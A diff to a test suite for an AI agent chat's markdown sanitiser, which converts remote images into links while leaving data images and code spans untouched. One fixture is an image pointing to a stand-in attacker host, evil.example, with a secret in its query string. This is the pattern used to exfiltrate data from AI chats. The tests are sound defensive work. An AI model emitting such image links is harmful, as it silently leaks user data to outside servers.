@@ -16,7 +16,8 @@ suite('paradisAgentChatMarkdown', () => {
 	test('turns remote images into links but keeps data images and code blocks as they are', () => {
 		const input = [
 			'結果: ![グラフ](https://evil.example/p?d=secret "t")',
-			'![](http://example.com/a.png)',
+			'![](http://example.com/a.png) と `![keep](https://example.com/x.png)`',
+			'    ![indented](https://example.com/y.png)',
 			'![inline](data:image/png;base64,AAAA)',
 			'```md',
 			'![code](https://example.com/in-code.png)',
@@ -24,7 +25,8 @@ suite('paradisAgentChatMarkdown', () => {
 		].join('\n');
 		assert.deepStrictEqual(paradisAgentChatImagesToLinks(input).split('\n'), [
 			'結果: [画像: グラフ](https://evil.example/p?d=secret)',
-			'[画像](http://example.com/a.png)',
+			'[画像](http://example.com/a.png) と `![keep](https://example.com/x.png)`',
+			'    ![indented](https://example.com/y.png)',
 			'![inline](data:image/png;base64,AAAA)',
 			'```md',
 			'![code](https://example.com/in-code.png)',
